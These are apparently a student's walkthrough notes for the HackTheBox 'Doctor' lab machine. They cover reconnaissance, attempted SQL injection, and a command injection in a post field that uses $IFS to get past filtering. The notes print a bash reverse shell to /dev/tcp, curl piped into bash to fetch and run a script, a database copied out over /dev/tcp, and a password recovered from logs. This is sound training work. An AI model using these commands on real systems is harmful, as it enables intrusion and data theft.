## This is the notes regarding the "doctor" machine on the HackTheBox.
----------------------------------------------------------------------
1. Like always we start with `nmap` scan:
    - `nmap -v -sC -sV -oA nmap/doctor 10.10.10.209` 

2. We take a look to the website, we check `index.php`, results in Not Found.
    Then we check the `index.html` which is fine. This is because so that we 
    can check if the website is a php one. But `index.php` is not found.

3. We run `gobuster` on the website to find if there is any possible endpoint:
    - `gobuster -u http://10.10.10.209 -w /usr/share/seclists/Disovery/Web-Content/raft-small-words.txt -o gobuster/root-dir.txt`

4. As `gobuster` runs, meanwhile the `nmap` is finished. We see that there are 3 ports open.
    22 for ssh, 80 for http, and 8089 which is a ssl/tcp Splunkd (?) httpd service.

5. We take a look to the https://10.10.10.209:8089 and we accept the certificate. 
    We see bunch of Splunkd reports. We see that some links require authentication. 
    We try the default Splunkd credentials, which is `admin` and `changeme`.
    We get nowhere!

6. We check the home page, see some links, there is nothing intersting, 
    except there is a message saying contact us and an email with the address, 
    `info@doctors.htb`. We add this hostname to our hostsfile with the IP address of `10.10.10.209`.
    we get a login page. We try `admin` and an SQL injection password real quick, `a' or 1=1-- -`
    A trick to show the password typed, is to go to Inspector and in the respective filed, 
    remove the type of the filled which is password. Now we check the login but to no avail!

7. Now we send the login request to Burp Suit. We intercept the login request, 
    send it repeater tab, get rid of the SQL injection part in the password section, 
    copy the request to a `login.req` file and try to SQL inject test it with `sqlmap`:
    - `sqlmap -r requests/login.req --batch`
    no test succeeds, so we increase the level and risk factors:
    - `sqlmap -r requests/login.req --batch --level 5 --risk 3`

8. While those sqlmaps work, we try to the "Forgot Password" functionality. 
    We try a an email, `admin@doctors.htb` and intercept it with Burp Suit. 
    When we forward the request we see a cross site reference token, 
    `cfrs_token` which will make the `sqlmap`'s work way harder.
    Then we put that `sqlmap` injection test in bed for a while.

9. We check the register funtionality, we register with a dummy user and email, and then login. 
    Only interesting thing to do is to post messages. 

10. We listen on port 80 and grab the header with `nc`:
    - `nc -lvnp 80` 
    then we post a dummy content and see that the User-Agent is `curl`.
    because the user-agent is `curl` then they are trying some bash commands
    to execute the content posting, then we can try some testing like running a server
    on our end and see if we can inject the post utility, (if this was something like python 
    requests we wouldn't probably try something like this) to test this we create a dummy file, 
    then run a server on that directory, here it is `www`, then try to grab it from our ip and 
    then redirect it to somewhere:
    - `echo "Don't sell out." > test`
    - `sudo python3 -m http.server 80`
    then in the post content we do:
    - `http://10.10.16.6/test -o /var/www/html/test`
    there is a weird behaviour that in ippsec video he can post a link, but here when we try
    to post a link, it get's denied!
    this behaviour is accounted for when we realize that we have to turn on Burp Suit proxy, 
    but the intercept is off(?)

11. When we try something like `http://10.10.16.6/$(whoami)` as the post content we get a get
    a `/web` 404 response, so the command got actually executed, probably on the backend something
    like `os.popen('curl $content')` is being run.

12. Note that we have a server open with python, like: `python3 -m http.server 80`. Now if we intercept the 
    post request with Burp Suit, we can change the content of the request, if we put in post content in the 
    Burp Suit, "http://10.10.16.6/$(which$IFS'curl')" we can see that in the python server, it tries to get 
    `/usr/bin/curl` now we can inject this post submit function, note that the way we came up to `$IFS` for 
    a space was by trial and error, the optin would be `+` which does not works, and the single quotes around 
    curl came also by trial and error, the way to test these is that usually these are special characters so 
    so by trial we came across them, other would be {} to test, but it does not work, since probably curly braces
    are sort of more special. Now we try to past the output of `test`file in our local machine to `/var/www/html/`
    and go to `doctors.htb/test` to see if we were successful. We put in the content of the post:
    - `&content=http://10.10.16.6/$(curl$IFS'-o'$IFS'/var/www/html/test'$IFS'http://10.10.16.6/test')`
    this way curl connects to our local python server, reads the test and writes in the html directory, 
    now we go to `10.10.10.209/test` and we see that it worked!

13. Now we put it a simple bash reverse shell in the test file:
    - `bash -c 'bash -i &> /dev/tcp/10.10.16.6/9001 0>&1'`
    and now we download this file to the server with this as the post content:
    - `http://10.10.16.6/$(curl$IFS'-o'$IFS'/var/www/html/test'$IFS'http://10.10.16.6/test')`
    if we go to 10.10.10.209/test , we can see the reverse shell one liner.

14. Now we have to execute this file from the server side, while we are listening on port 9001:
    - `nc -lvnp 9001`
    we put this as the post content:
    - `http://10.10.16.6/$(bash$IFS'/var/www/html/test')`
    which 10.10.16.6 is out ip address.
    we get the reverse shell!
    Now we do our usual spawn of tty:
    - `python3 -c 'impoty pty;pty.spawn("/bin/bash")'`
    - `export TERM=xterm`

15. Now that we have our shell in the machine, we look around we see a `blog` dirtectory, we look around and 
    see a `site.db` site database. we want to dump this file to a `.dump` with `sqlite3` but we don't have that
    on our machine, so we transfer that to our local machine like this:
    on the remote machine:
    - `cat site.db > /dev/tcp/10.10.16.6/9001`
    and on our local machine:
    - `nc -lvnp 9001 > site.db`
    Now we have our file! (this is dark arts!)

16. We dump the database:
    - `sqlite3 site.db .dump`
    we see that there is an `admin` user and a bcrypt hash of the password.]
    this is hard to crack, but nevertheless we try on the background with `hashcat`.

17. We run the `linpeas.sh` in the background also:
    - `curl 10.10.16.6:80/linpeas.sh | bash`
    while we have a server running on port 80 in the same directory as the `linpeas.sh` script.

18. In the output of the `linpeas.sh` in the readable files by root and by me but not by world, we 
    see bunch of log files, also there is a backup log, which is not usual, we take a look to that,
    `cat /var/log/apache2/backup` we see that it's a log of all the GET/POST requests to the server,
    we take a look to the content of the requests:
    - `cat backup | awk '{print $7}' | sort | uniq -c | sort -n`
    in one these requests we see that it's a GET for a `reset_password` action:
    - `/reset_password?email=Guitar123`
    we try this password for the sudo and shaun users that we got from the linpeas.sh output.
    - `su shaun` and with this password it works!



